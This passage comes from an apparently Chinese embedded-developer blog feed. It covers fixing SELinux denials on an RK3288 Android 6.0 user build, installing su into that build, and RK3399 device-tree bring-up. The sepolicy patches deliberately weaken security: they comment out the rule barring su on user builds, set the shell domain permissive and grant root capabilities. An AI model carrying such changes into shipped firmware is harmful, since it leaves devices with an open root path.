name:persist.usb.mode</code></pre><ul><li>与USB模式修改相关的文件</li></ul><pre><code class="bash">system/displayd/OtgManager.cppdevice/rockchip/common/init.rk30board.rcdevice/rockchip/common/sepolicy/property_contextsexternal/sepolicy/platform_app.teexternal/sepolicy/app.te</code></pre><ul><li>与USB模式修改相关的配置</li></ul><pre><code class="bash">ro.adb.secure=1ro.debuggablepersist.usb.mode</code></pre><p>参考博客 <a href="https://blog.csdn.net/tung214/article/details/72734086">Android SELinux avc dennied权限问题解决方法</a> , 分析错误log</p><pre><code class="bash">[   54.422452] type=1400 audit(1640315085.300:22): avc: denied &#123; write &#125; for pid=601 comm=&quot;ndroid.systemui&quot; name=&quot;force_usb_mode&quot; dev=&quot;sysfs&quot; ino=12816 scontext=u:r:platform_app:s0:c512,c768 tcontext=u:object_r:sysfs:s0 tclass=file permissive=0</code></pre><ul><li>缺失权限：denied { <code>write</code> }</li><li>缺失权限的进程：scontext=u:r:<code>platform_app</code></li><li>访问的文件：tcontext=u:object_r:<code>sysfs</code>:s0</li><li>访问的文件类型：tclass=<code>file</code></li></ul><p>所以需要在 <code>external/sepolicy/platform_app.te</code>中或者 <code>device/rockchip/common/sepolicy/platform_app.te</code> 中添加</p><pre><code class="bash">allow platform_app sysfs:file write;</code></pre><p>或者</p><pre><code class="bash">allow platform_app sysfs:file rwx_file_perms;</code></pre><p>但是添加后<strong>编译失败</strong>，因为这个权限是默认不允许 (<code>neverallow</code>) 的，log如下：</p><pre><code class="bash">libsepol.report_failure: neverallow on line 353 of external/sepolicy/app.te (or line 7601 of policy.conf) violated by allow platform_app sysfs:file &#123; write &#125;;libsepol.check_assertions: 1 neverallow failures occurredError while expanding policyexternal/sepolicy/Android.mk:69: recipe for target &#39;out/target/product/rk3288/obj/ETC/sepolicy_intermediates/sepolicy&#39; failedmake: *** [out/target/product/rk3288/obj/ETC/sepolicy_intermediates/sepolicy] Error 1make: *** Waiting for unfinished jobs....</code></pre><p>根据log提示，打开文件 <code>external/sepolicy/app.te</code> <code>353</code> 行，将 <code>neverallow</code> 的部分注释掉，或者取消 <code>platform_app</code> 的限制，再次编译就可以了。</p><h3 id="solution-2"><a href="#solution-2" class="headerlink" title="solution"></a>solution</h3><p>根据以上分析结果，添加权限。</p><pre><code class="bash">diff --git a/app.te b/app.teindex 40de074..68ec6dd 100755--- a/app.te+++ b/app.te@@ -349,7 +349,7 @@ neverallow appdomain efs_file:dir_file_class_set write; neverallow &#123; appdomain -shell &#125; efs_file:dir_file_class_set read; # Write to various pseudo file systems.-neverallow &#123; appdomain -bluetooth -nfc &#125;+neverallow &#123; appdomain -bluetooth -nfc -platform_app &#125;     sysfs:dir_file_class_set write; neverallow appdomain     proc:dir_file_class_set write;diff --git a/platform_app.te b/platform_app.teindex 2afe4d8..c523de3 100644--- a/platform_app.te+++ b/platform_app.te@@ -41,3 +41,4 @@ allow platform_app radio_service:service_manager find; allow platform_app surfaceflinger_service:service_manager find; allow platform_app app_api_service:service_manager find; allow platform_app system_api_service:service_manager find;+allow platform_app sysfs:file write;</code></pre><h2 id="set-persist-usb-mode-fail"><a href="#set-persist-usb-mode-fail" class="headerlink" title="set persist.usb.mode fail"></a>set persist.usb.mode fail</h2><p>以上解决了 platform_app 的权限问题，下面还有一个权限问题。</p><pre><code class="bash">[   54.466011] init: avc:  denied  &#123; set &#125; for property=persist.usb.mode scontext=u:r:system_app:s0 tcontext=u:object_r:default_prop:s0 tclass=property_service[   54.466052] init: sys_prop: permission denied uid:1000  name:persist.usb.mode</code></pre><h3 id="solution-3"><a href="#solution-3" class="headerlink" title="solution"></a>solution</h3><p>属性 <code>persist.usb.mode</code> 无法被 <code>set</code>, 这个不一定要修改 <code>system_app.te</code>, 可以在 <code>sepolicy/property_contexts</code> 中添加以下信息：</p><pre><code class="bash">diff --git a/sepolicy/property_contexts b/sepolicy/property_contextsindex 8593ab2..7e113f1 100755--- a/sepolicy/property_contexts+++ b/sepolicy/property_contexts@@ -3,3 +3,4 @@ sys_graphic.            u:object_r:graphic_prop:s0 #ro.serialno             u:object_r:serialno_prop:s0 drm.                    u:object_r:drm_prop:s0 media.                  u:object_r:media_prop:s0+persist.usb.            u:object_r:system_prop:s0</code></pre><h2 id="user-service-sh-Permission-denied"><a href="#user-service-sh-Permission-denied" class="headerlink" title="user_service.sh Permission denied"></a>user_service.sh Permission denied</h2><p><code>user_service.sh</code> 是我们添加的一个开机启动脚本，开机log中提示 <code>user_service.sh</code> 不能执行，没有权限。</p><pre><code class="bash">[   90.229367] init: cannot execve(&#39;/system/bin/user_service.sh&#39;): Permission denied[   90.229966] type=1400 audit(1640583793.920:23): avc: denied &#123; entrypoint &#125; for pid=1166 comm=&quot;init&quot; path=&quot;/system/bin/user_service.sh&quot; dev=&quot;mmcblk0p10&quot; ino=462 scontext=u:r:shell:s0 tcontext=u:object_r:system_file:s0 tclass=file permissive=0</code></pre><h3 id="solution-4"><a href="#solution-4" class="headerlink" title="solution"></a>solution</h3><p>修改 <code>external/sepolicy/&#123;domain.te,shell.te&#125;</code>, 启用 <code>shell</code> 的 <code>entrypoint</code> 权限。</p><pre><code class="bash">diff --git a/domain.te b/domain.teindex 2b30bd7..25b5ffb 100755--- a/domain.te+++ b/domain.te@@ -251,7 +251,7 @@ neverallow &#123; domain -init &#125; kernel:security setsecparam; neverallow &#123; domain -init -system_server -ueventd &#125; hw_random_device:chr_file *; # Ensure that all entrypoint executables are in exec_type.-neverallow domain &#123; file_type -exec_type &#125;:file entrypoint;+neverallow &#123; domain -shell &#125; &#123; file_type -exec_type &#125;:file entrypoint; # Ensure that nothing in userspace can access /dev/mem or /dev/kmem neverallow &#123; domain -kernel -ueventd -init &#125; kmem_device:chr_file *;diff --git a/shell.te b/shell.teindex 4b4093d..0350b7a 100644--- a/shell.te+++ b/shell.te@@ -37,7 +37,7 @@ allow shell tty_device:chr_file rw_file_perms; allow shell console_device:chr_file rw_file_perms; allow shell input_device:dir r_dir_perms; allow shell input_device:chr_file rw_file_perms;-allow shell system_file:file x_file_perms;+allow shell system_file:file &#123; entrypoint x_file_perms &#125;; allow shell shell_exec:file rx_file_perms; allow shell zygote_exec:file rx_file_perms;</code></pre><h2 id="ping-fail-after-4G-wifi-network-enabled"><a href="#ping-fail-after-4G-wifi-network-enabled" class="headerlink" title="ping fail after 4G/wifi network enabled"></a>ping fail after 4G/wifi network enabled</h2><p><code>user_service.sh</code> 在后台监听网络状态，状态修改后会自动添加路由，更新iptables等，但是 <code>user</code> 版本很多指令执行失败了，导致与本地连接的算法板之间的网络不通。而且切换网络（如关闭、打开wifi）时会打印以下权限问题。</p><pre><code class="bash">$ [  423.709562] type=1400 audit(1640656107.794:490): avc: denied &#123; write &#125; for pid=3901 comm=&quot;pppd&quot; name=&quot;ppp&quot; dev=&quot;mmcblk0p13&quot; ino=342742 scontext=u:r:rild:s0 tcontext=u:object_r:system_data_file:s0 tclass=dir permissive=0[  426.563145] type=1400 audit(1640656110.694:491): avc: denied &#123; write &#125; for pid=3901 comm=&quot;pppd&quot; name=&quot;ppp&quot; dev=&quot;mmcblk0p13&quot; ino=342742 scontext=u:r:rild:s0 tcontext=u:object_r:system_data_file:s0 tclass=dir permissive=0[  426.620393] init: avc:  denied  &#123; set &#125; for property=net.interfaces.defaultroute scontext=u:r:rild:s0 tcontext=u:object_r:system_prop:s0 tclass=property_service[  426.620467] init: sys_prop: permission denied uid:0  name:net.interfaces.defaultroute[  426.641853] init: avc:  granted  &#123; set &#125; for property=net.ppp0.dns1 scontext=u:r:rild:s0 tcontext=u:object_r:net_radio_prop:s0 tclass=property_service[  426.660313] init: avc:  granted  &#123; set &#125; for property=net.ppp0.dns2 scontext=u:r:rild:s0 tcontext=u:object_r:net_radio_prop:s0 tclass=property_service[  426.676997] init: avc:  granted  &#123; set &#125; for property=net.ppp0.local-ip scontext=u:r:rild:s0 tcontext=u:object_r:net_radio_prop:s0 tclass=property_service[  426.693011] init: avc:  granted  &#123; set &#125; for property=net.ppp0.remote-ip scontext=u:r:rild:s0 tcontext=u:object_r:net_radio_prop:s0 tclass=property_service[  426.704633] init: avc:  granted  &#123; set &#125; for property=net.ppp0.gw scontext=u:r:rild:s0 tcontext=u:object_r:net_radio_prop:s0 tclass=property_service[  427.055027] init: avc:  denied  &#123; set &#125; for property=persist.telephony.test.singleDc scontext=u:r:rild:s0 tcontext=u:object_r:default_prop:s0 tclass=property_service[  427.055347] init: sys_prop: permission denied uid:0  name:persist.telephony.test.singleDc[  606.939187] ==&gt; rtl8188e_iol_efuse_patch[  607.175605] RTL871X: nolinked power save leave[  608.502840] RTL871X: nolinked power save enter</code></pre><h3 id="solution-5"><a href="#solution-5" class="headerlink" title="solution"></a>solution</h3><p>这个问题非常麻烦，因为是 <code>user</code> 版本，没有root权限调试，绝大部分指令都无法使用，根本无法调试，所以我花费了一定时间将su集成进 user版本，详情见另一篇专门说明如何在 <code>user</code> 版本添加 <code>su</code> 的 <a href="https://www.litreily.top/:4000/2021/12/30/rk3288-su/">文档</a> 。</p><p>集成 <code>su</code> 后，发现能够进入 root 状态了，但是 <code>android 6.0</code> root用户也不是无所不能的，由于 <code>sepolicy</code> 的导入，导致很多权限都没有，于是只能一个个的查看log，然后修改 <code>.te</code> 文件，修改的文件主要包含以下几个。</p><pre><code class="bash">device/rockchip/common/sepolicy/shell.tedevice/rockchip/common/sepolicy/rild.tedevice/rockchip/common/sepolicy/property_contextsexternal/sepolicy/shell.teexternal/sepolicy/domain.teexternal/sepolicy/app.te</code></pre><p>补丁如下</p><ul><li><code>external/sepolicy</code></li></ul><pre><code class="bash">diff --git a/app.te b/app.teindex 5f8f648..419ecce 100755--- a/app.te+++ b/app.te@@ -213,7 +213,7 @@ selinux_check_context(appdomain)  # Superuser capabilities. # bluetooth requires net_admin and wake_alarm.-neverallow &#123; appdomain -bluetooth &#125; self:capability *;+neverallow &#123; appdomain -bluetooth -shell &#125; self:capability *; neverallow &#123; appdomain -bluetooth &#125; self:capability2 *;  # Block device access.@@ -349,7 +349,7 @@ neverallow appdomain efs_file:dir_file_class_set write; neverallow &#123; appdomain -shell &#125; efs_file:dir_file_class_set read;  # Write to various pseudo file systems.-neverallow &#123; appdomain -bluetooth -nfc -platform_app &#125;+neverallow &#123; appdomain -shell -bluetooth -nfc -platform_app &#125;     sysfs:dir_file_class_set write; neverallow appdomain     proc:dir_file_class_set write;diff --git a/domain.te b/domain.teindex 25b5ffb..ad765e7 100755--- a/domain.te+++ b/domain.te@@ -338,7 +338,7 @@ neverallow domain default_android_service:service_manager add;  # Require that domains explicitly label unknown properties, and do not allow # anyone but init to modify unknown properties.-neverallow &#123; domain -init &#125; default_prop:property_service set;+neverallow &#123; domain -init -rild &#125; default_prop:property_service set;  neverallow &#123; domain -init -recovery -system_server &#125; frp_block_device:blk_file rw_file_perms; @@ -398,7 +398,7 @@ neverallow domain &#123; file_type fs_type dev_type &#125;:&#123; lnk_file fifo_file sock_file # Nobody should be able to execute su on user builds. # On userdebug/eng builds, only dumpstate, shell, and # su itself execute su.-neverallow &#123; domain userdebug_or_eng(`-dumpstate -shell -su&#39;) &#125; su_exec:file no_x_file_perms;+# neverallow &#123; domain userdebug_or_eng(`-dumpstate -shell -su&#39;) &#125; su_exec:file no_x_file_perms;  # Do not allow the introduction of new execmod rules. Text relocations # and modification of executable pages are unsafe.diff --git a/shell.te b/shell.teindex 0350b7a..836f9fd 100644--- a/shell.te+++ b/shell.te@@ -40,6 +40,8 @@ allow shell input_device:chr_file rw_file_perms; allow shell system_file:file &#123; entrypoint x_file_perms &#125;; allow shell shell_exec:file rx_file_perms; allow shell zygote_exec:file rx_file_perms;+allow shell su_exec:file rx_file_perms;+allow shell shell:capability &#123; net_admin net_raw dac_override setgid setuid &#125;;</code></pre><ul><li><code>device/rockchip/common</code></li></ul><pre><code class="bash">diff --git a/sepolicy/property_contexts b/sepolicy/property_contextsindex 7e113f1..530d8aa 100755--- a/sepolicy/property_contexts+++ b/sepolicy/property_contexts@@ -4,3 +4,4 @@ sys_graphic.            u:object_r:graphic_prop:s0 drm.                    u:object_r:drm_prop:s0 media.                  u:object_r:media_prop:s0 persist.usb.            u:object_r:system_prop:s0+net.interfaces.         u:object_r:system_prop:s0diff --git a/sepolicy/rild.te b/sepolicy/rild.teindex a798f14..9cfb015 100644--- a/sepolicy/rild.te+++ b/sepolicy/rild.te@@ -16,6 +16,8 @@ unix_socket_connect(rild, rpc_reg, rpc); # ppp for 3G dongle  allow rild ppp_device:chr_file rw_file_perms; allow rild net_radio_prop:property_service set;+allow rild default_prop:property_service set;+allow rild system_prop:property_service set; allow rild ppp_exec:file &#123;execute execute_no_trans open&#125;; allow rild ppp_exec:file getattr; allow rild ppp_exec:file &#123; read &#125;;@@ -25,3 +27,4 @@ allow rild toolbox_exec:file &#123;getattr execute_no_trans execute read open&#125;; #allow rild system_data_file:dir &#123;write add_name&#125;; #allow rild system_data_file:file &#123;create write&#125;; allow rild self:capability &#123; sys_admin &#125;;+allow rild system_data_file:dir create_dir_perms;diff --git a/sepolicy/shell.te b/sepolicy/shell.teindex 7d1999c..8c2aeb1 100755--- a/sepolicy/shell.te+++ b/sepolicy/shell.te@@ -1,3 +1,4 @@+permissive shell; # Additional rules for shell allow shell toolbox_exec:file &#123; read getattr open execute execute_no_trans &#125;; allow shell gpsd_exec:file &#123; getattr execute read open execute_no_trans &#125;;@@ -7,3 +8,9 @@ allow shell serial_device:chr_file rw_file_perms; allow shell proc_cpuinfo:file mounton; allow shell surfaceflinger:fifo_file rw_file_perms; allow shell bootanim_exec:file getattr;+allow shell proc_net:file rw_file_perms;+allow shell self:udp_socket ioctl;+allow shell self:netlink_route_socket nlmsg_write;+allow shell net_data_file:dir search;+allow shell net_data_file:file rw_file_perms;+allow shell sysfs:file rw_file_perms</code></pre><p>权限问题解决后，发现启用 wifi、4G 网络后还是无法ping通算法板，于是开始慢慢调试路。</p><p>使用 <code>iptables</code> <code>ip rule</code> 等指令排查网络问题，发现wifi，4G网络启用后，ping 算法板会默认使用 <code>wifi</code> 或 <code>4G</code> 网络对应的链路，这说明路由出问题了。</p><p>然后我用 <code>ip rule</code> 去查策略路由，对比 <code>userdebug</code> 版本，发现少了一个 <code>table 1</code>, 这个table是用来添加算法板的默认路由的，而且优先级比较高，现在没有了。接着我找到了添加 <code>table 1</code> 的脚本，是 <code>user_service.sh</code> 中的函数 <code>add_route_table</code>。</p><pre><code class="bash">add_route_table() &#123;                                                                                                               PREF=$(ip rule list | busybox head -n 2 | busybox tail -n 1 | busybox awk &#39;&#123;print $1&#125;&#39; | busybox sed &#39;s/://g&#39;)    let PREF--                                                                                                               ip rule add from all table 1 pref $&#123;PREF&#125;&#125;</code></pre><p>我在shell中执行了以上指令，发现 <code>busybox</code> 找不到！好吧， <code>user</code> 版本没有编译 <code>busybox</code>, 那就把它去掉，逐个测试 <code>head</code>, <code>tail</code>, <code>awk</code>, <code>sed</code> 指令，发现 <code>awk</code> 指令也无法执行。</p><p>为了解决这个问题，我先根据指令去解析其意图，发现这条指令是为了获取 <code>ip rule list</code> 中第二行的前缀，也就是优先级对应的数值 <code>10000</code>。</p><pre><code class="bash">0:      from all lookup local10000:  from all fwmark 0xc0000/0xd0000 lookup legacy_system13000:  from all fwmark 0x10063/0x1ffff lookup local_network15000:  from all fwmark 0x0/0x10000 lookup legacy_system16000:  from all fwmark 0x0/0x10000 lookup legacy_network17000:  from all fwmark 0x0/0x10000 lookup local_network23000:  from all fwmark 0x0/0xffff uidrange 0-0 lookup main32000:  from all unreachable</code></pre><p>既如此，解决方案就简单了，根本不需要 <code>awk</code>, <code>sed</code>, 直接用 <code>cut</code> 就好了，patch如下。</p><pre><code class="bash"> add_route_table() &#123;                                                                                                           -    PREF=$(ip rule list | busybox head -n 2 | busybox tail -n 1 | busybox awk &#39;&#123;print $1&#125;&#39; | busybox sed &#39;s/://g&#39;)+    PREF=$(ip rule list | head -n 2 | tail -n 1 | cut -d &#39;:&#39; -f1)     let PREF--                                                                                                                ip rule add from all table 1 pref $&#123;PREF&#125; &#125;</code></pre><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul><li><a href="https://wiki.t-firefly.com/zh_CN/AIO-3288J/compile_android_firmware.html">AIO RK3288J 编译 Android 5.1 固件</a></li><li><a href="https://blog.csdn.net/tung214/article/details/72734086">Android SELinux avc dennied权限问题解决方法</a></li><li><a href="https://blog.csdn.net/qq_25815655/article/details/85339415">system.prop添加自己的字段 SystemProperties.get权限问题</a></li><li><a href="https://www.cnblogs.com/inkhearts/p/10478981.html">MTK(android init.rc) 写一个开机启动的服务</a></li><li><a href="https://www.cnblogs.com/blogs-of-lxl/p/7515023.html">Android : SELinux 简析&amp;修改</a></li><li><a href="https://blog.csdn.net/ai_knight/article/details/67634920">init: Warning! Service preinstall needs a SELinux domain defined; please fix!</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> android </tag>
            
            <tag> rk3288 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RK3288 android 6.0 user release 获取 root 权限</title>
      <link href="2021/12/30/rk3288-su/"/>
      <url>2021/12/30/rk3288-su/</url>
      
        <content type="html"><![CDATA[<p>编译 RK3288 <code>user</code> 版本后，固件不会安装su，也就无法使用root权限，导致很多功能无法调试，非常不便。</p><p>为此，我想办法把 su 重新加到系统里了。</p><h2 id="准备su"><a href="#准备su" class="headerlink" title="准备su"></a>准备su</h2><p>先使用 <code>userdebug</code> 模式编译系统，将 <code>out/target/product/rk3288/system/xbin/su</code> 保存到别的地方，因为改用 <code>user</code> 模式编译后会覆盖掉。</p><pre><code class="bash">mkdir ~/backupcp out/target/product/rk3288/system/xbin/su ~/backup/</code></pre><h2 id="删除-su-Android-mk"><a href="#删除-su-Android-mk" class="headerlink" title="删除 su Android.mk"></a>删除 su Android.mk</h2><pre><code class="bash">rm system/extras/su/Android.mk</code></pre><p>删除后，固件编译就不会遍历到这个目录了。</p><h2 id="拷贝su"><a href="#拷贝su" class="headerlink" title="拷贝su"></a>拷贝su</h2><p>为了把前面保存的 <code>su</code> 安装到系统中，可以通过在某个系统app的<code>android.mk</code> 添加一个拷贝操作。</p><p>比如我们使用的 <code>demo-app</code></p><pre><code class="bash">$ cp ~/backup/su packages/apps/demo-app/$ cd packages/apps/demo-app/$ lsAndroid.mk  demo-app.apk  lib  su$ cat Android.mkLOCAL_PATH := $(call my-dir)include $(CLEAR_VARS)LOCAL_MODULE := demo-appLOCAL_MODULE_CLASS := APPSLOCAL_MODULE_TAGS := optionalLOCAL_BUILT_MODULE_STEM := package.apkLOCAL_SRC_FILES := $(LOCAL_MODULE).apk$(shell mkdir -p $(PRODUCT_OUT)/system/lib)$(shell cp -rf $(LOCAL_PATH)/lib/armeabi/*  $(PRODUCT_OUT)/system/lib)# install su$(shell mkdir -p $(PRODUCT_OUT)/system/xbin)$(shell cp -f $(LOCAL_PATH)/su  $(PRODUCT_OUT)/system/xbin/)LOCAL_MODULE_SUFFIX := $(COMMON_ANDROID_PACKAGE_SUFFIX)LOCAL_PRIVILEGED_MODULE := falseLOCAL_CERTIFICATE := PRESIGNED</code></pre><p>其中包含的以下两行便是拷贝操作，这样可以将 <code>su</code> 安装到系统。</p><pre><code class="bash">$(shell mkdir -p $(PRODUCT_OUT)/system/xbin)$(shell cp -f $(LOCAL_PATH)/su  $(PRODUCT_OUT)/system/xbin/)</code></pre><h2 id="修改权限"><a href="#修改权限" class="headerlink" title="修改权限"></a>修改权限</h2><p>安装后执行 <code>su</code> 会报各种权限问题，需要修改 <code>external/sepolicy/</code> 中的 <code>shell.te</code>, <code>domain.te</code> 予以支持。</p><pre><code class="bash">diff --git a/app.te b/app.teindex 5f8f648..6658222 100755--- a/app.te+++ b/app.te@@ -213,7 +213,7 @@ selinux_check_context(appdomain)  # Superuser capabilities. # bluetooth requires net_admin and wake_alarm.-neverallow &#123; appdomain -bluetooth &#125; self:capability *;+neverallow &#123; appdomain -bluetooth -shell &#125; self:capability *; neverallow &#123; appdomain -bluetooth &#125; self:capability2 *;  # Block device access.diff --git a/domain.te b/domain.teindex 25b5ffb..ad765e7 100755--- a/domain.te+++ b/domain.te@@ -338,7 +338,7 @@ neverallow domain default_android_service:service_manager add;  # Require that domains explicitly label unknown properties, and do not allow # anyone but init to modify unknown properties.-neverallow &#123; domain -init &#125; default_prop:property_service set;+neverallow &#123; domain -init -rild &#125; default_prop:property_service set;  neverallow &#123; domain -init -recovery -system_server &#125; frp_block_device:blk_file rw_file_perms; @@ -398,7 +398,7 @@ neverallow domain &#123; file_type fs_type dev_type &#125;:&#123; lnk_file fifo_file sock_file # Nobody should be able to execute su on user builds. # On userdebug/eng builds, only dumpstate, shell, and # su itself execute su.-neverallow &#123; domain userdebug_or_eng(`-dumpstate -shell -su&#39;) &#125; su_exec:file no_x_file_perms;+# neverallow &#123; domain userdebug_or_eng(`-dumpstate -shell -su&#39;) &#125; su_exec:file no_x_file_perms;  # Do not allow the introduction of new execmod rules. Text relocations # and modification of executable pages are unsafe.diff --git a/shell.te b/shell.teindex 0350b7a..e94a8dc 100644--- a/shell.te+++ b/shell.te@@ -40,6 +40,8 @@ allow shell input_device:chr_file rw_file_perms; allow shell system_file:file &#123; entrypoint x_file_perms &#125;; allow shell shell_exec:file rx_file_perms; allow shell zygote_exec:file rx_file_perms;+allow shell su_exec:file rx_file_perms;+allow shell shell:capability &#123; net_admin net_raw dac_override setgid setuid &#125;;  r_dir_file(shell, apk_data_file)</code></pre><p>关于添加权限，需要根据 <code>avc: denied</code> 相关错误信息去逐条添加。添加权限后可能出现编译失败并提示 <code>neverallow</code> 的信息，这个时候根据提示去修改相应文件，比如 <code>external/sepolicy/domain.te</code>，将所添加的项目排查在外即可，或者直接注释掉对应的 <code>neverallow</code> 条例。不过修改<code>neverallow</code> 条例可能会导致 <code>Google CTS</code> 测试失败，这个不确定后续会不会有影响，但如果只是为了调试，后续再revert就好了。</p><p>最后，由于 <code>Android 6.0</code> 严格的 sepolicy 权限管理，即使使用 <code>su</code> 获得了root权限，也不是无所不能的，很多权限仍旧受限，比如默认的 <code>ifconfig</code> ， <code>iptables</code> 等指令都无法使用，这时候还是需要根据提示去添加相应权限才行。</p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> android </tag>
            
            <tag> rk3288 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RK3399 新设计工控机配置指南</title>
      <link href="2021/12/20/rk3399-dts/"/>
      <url>2021/12/20/rk3399-dts/</url>
      
        <content type="html"><![CDATA[<p>用时两周，总算将新的 RK3399 工控机配置好了，期间遇到各种坑，在此记录一二。</p><h2 id="RK3399-工控机硬件配置"><a href="#RK3399-工控机硬件配置" class="headerlink" title="RK3399 工控机硬件配置"></a>RK3399 工控机硬件配置</h2><p>首先看下硬件配置。</p><table><thead><tr><th>接口</th><th>数量</th><th>说明</th></tr></thead><tbody><tr><td>TypeC</td><td>1个</td><td>OTG 口，可用于烧录固件</td></tr><tr><td>USB3.0</td><td>4个</td><td></td></tr><tr><td>USB2.0</td><td>2个</td><td></td></tr><tr><td>RTC芯片 hym8563</td><td>1个</td><td>用于RTC时钟存储</td></tr><tr><td>SD</td><td>1个</td><td>可插入SD/TF 卡</td></tr><tr><td>HDMI</td><td>1个</td><td>可接显示器</td></tr><tr><td>以太网口</td><td>2个</td><td>1个千兆，1个百兆</td></tr><tr><td>串口</td><td>3个</td><td>UART0, UART2, UART4, 其中UART2 作为console，波特率1500000</td></tr><tr><td>cp210x</td><td>1个</td><td>对应 /dev/ttyUSB0</td></tr><tr><td>pwm</td><td>1个</td><td>对应 pwm3</td></tr><tr><td>led</td><td>2个</td><td>电源指示灯，状态指示灯</td></tr><tr><td>按键</td><td>2个</td><td>1个复位按键，1个recover按键</td></tr><tr><td>DC-12 电源</td><td>1个</td><td>12V直流电源，rk808 电源芯片</td></tr></tbody></table><h2 id="kernel-启动失败"><a href="#kernel-启动失败" class="headerlink" title="kernel 启动失败"></a>kernel 启动失败</h2><p>首次编译SDK通过后，烧录固件至工控机，uboot正常执行，但是kernel执行3s左右停止。停止的位置固定，但是没有错误信息，感觉像是突然停止，停止前面是USB驱动加载信息，停止后不会自动重启。这个问题困扰我很久。</p><pre><code class="bash">[    1.963510] hub 4-0:1.0: USB hub found[    1.964024] hub 4-0:1.0: 1 port detected[    1.966154] dwmmc_rockchip fe310000.dwmmc: IDMAC supports 32-bit address mode.[    1.966842] dwmmc_rockchip fe310000.dwmmc: Using internal DMA controller.[    1.967451] dwmmc_rockchip fe310000.dwmmc: Version ID is 270a[    1.968004] dwmmc_rockchip fe310000.dwmmc: DW MMC controller at irq 25,32 bit host data width,256 deep fifo[    1.968898] dwmmc_rockchip fe310000.dwmmc: &#39;clock-freq-min-max&#39; property was deprecated.[    1.969733] dwmmc_rockchip fe310000.dwmmc: No vmmc regulator found[    1.970282] dwmmc_rockchip fe310000.dwmmc: No vqmmc regulator found[    1.971302] dwmmc_rockchip fe310000.dwmmc: allocated mmc-pwrseq[    1.985263] mmc_host mmc1: Bus speed (slot 0) = 400000Hz (slot req 400000Hz, actual 400000HZ div = 0)[    1.999140] dwmmc_rockchip fe310000.dwmmc: 1 slots initialized[    2.001576] dwmmc_rockchip fe320000.dwmmc: IDMAC supports 32-bit address mode.[    2.002303] dwmmc_rockchip fe320000.dwmmc: Using internal DMA controller.[    2.002958] dwmmc_rockchip fe320000.dwmmc: Version ID is 270a[    2.003537] dwmmc_rockchip fe320000.dwmmc: DW MMC controller at irq 26,32 bit host data width,256 deep fifo[    2.004488] dwmmc_rockchip fe320000.dwmmc: &#39;clock-freq-min-max&#39; property was deprecated.[    2.005456] dwmmc_rockchip fe320000.dwmmc: No vmmc regulator found[    2.006611] dwmmc_rockchip fe320000.dwmmc: allocated mmc-pwrseq[    2.007435] rockchip-iodomain ff770000.syscon:io-domains: Setting to 3300000 done[    2.008482] rockchip-iodomain ff770000.syscon:io-domains: Setting to 3300000 done[    2.022019] mmc_host mmc2: Bus speed (slot 0) = 400000Hz (slot req 400000Hz, actual 400000HZ div = 0)[    2.026205] mmc_host mmc1: Bus speed (slot 0) = 300000Hz (slot req 300000Hz, actual 300000HZ div = 0)[    2.035890] dwmmc_rockchip fe320000.dwmmc: 1 slots initialized[    2.040194] input: gpio-keys as /devices/platform/gpio-keys/input/input2[    2.041572] ==gsl_ts_init==[    2.041975] ret=0[    2.043363] rk808-rtc rk808-rtc: setting system clock to 2013-01-19 05:34:15 UTC (1358573655)[    2.066790] mmc_host mmc1: Bus speed (slot 0) = 200000Hz (slot req 200000Hz, actual 200000HZ div = 0)[    2.078907] u?[    2.111206] phy phy-ff770000.syscon:usb2-phy@e450.6: charger = USB_SDP_CHARGER[    2.115781] rockchip-dwc3 usb0: USB peripheral connected[    2.151998] usb 1-1.2: new full-speed USB device number 3 using ehci-platform[    2.175032] usb 5-1: new high-speed USB device number 2 using xhci-hcd</code></pre><p>由于是新设计的板子，所以无法确定是硬件问题还是软件问题，假定硬件没问题，那就是软件配置问题，于是我逐一排查DTS中gpio的配置，比对工控机原理图，发现 <code>SYR837</code> CPU 电源管理芯片的 gpio不匹配。原理图中配置如下：</p><p><img src="/assets/rk3399/syr837.png" alt="syr837"></p><p><code>CPU_B_SLEEP_H</code> 对应管脚如下：</p><p><img src="/assets/rk3399/syr837-gpio.png" alt="CPU_B_SLEEP_H"></p><p>这里是GPIO1_C1, 在dts中表示为 <code>GPIO1_17</code>, 实际dts中配置为 <code>GPIO1_18</code>, 所以不匹配，我将io修改后还是不行，怀疑是不是SPI功能复用所致，所以也确保SPI功能都<code>disabled</code>了，但是还是失败。</p><p>不过gpio修改后，发现log变了，kernel出现了 crash。log忘记保存了，根据crash信息，根据错误码排查到设备busy，说明有可能gpio被其它设备占用了，最后排查发现是 <code>vcc3v3_pcie</code> 节点也使用了 <code>GPIO1_17</code>, got you! 把这个disabled掉就正常了！而且这个pcie电源也没有被其它节点引用，所以禁用也不影响其它功能。</p><blockquote><p><strong>小结：</strong> kernel 启动失败的原因是cpu电源芯片的gpio配置错误，同时正确gpio还被<code>vcc3v3_pcie</code> 占用了，导致CPU供电异常，最后kernel停止运行。解决方案是修改<code>syr837</code> gpio配置，禁用 <code>vcc3v3_pcie</code></p></blockquote><pre><code class="patch">--- a/arch/arm64/boot/dts/rockchip/rk3399-firefly-linux.dts+++ b/arch/arm64/boot/dts/rockchip/rk3399-firefly-linux.dts@@ -239,6 +239,7 @@         vcc3v3_pcie: vcc3v3-pcie-regulator &#123;                compatible = &quot;regulator-fixed&quot;;+               status = &quot;disabled&quot;;                enable-active-high;                regulator-always-on;                regulator-boot-on;@@ -447,7 +448,7 @@                                                                                                         regulator-min-microvolt = &lt;712500&gt;;                regulator-max-microvolt = &lt;1500000&gt;;                regulator-ramp-delay = &lt;1000&gt;;-               vsel-gpios = &lt;&amp;gpio1 18 GPIO_ACTIVE_HIGH&gt;;+               vsel-gpios = &lt;&amp;gpio1 17 GPIO_ACTIVE_HIGH&gt;;                fcs,suspend-voltage-selector = &lt;1&gt;;                regulator-always-on;                regulator-boot-on;@@ -945,7 +946,7 @@  &amp;rockchip_suspend &#123;        rockchip,power-ctrl =-               &lt;&amp;gpio1 18 GPIO_ACTIVE_LOW&gt;,+               &lt;&amp;gpio1 17 GPIO_ACTIVE_LOW&gt;,                &lt;&amp;gpio1 14 GPIO_ACTIVE_HIGH&gt;; &#125;;</code></pre><h2 id="USB-3-0-供电失败"><a href="#USB-3-0-供电失败" class="headerlink" title="USB 3.0 供电失败"></a>USB 3.0 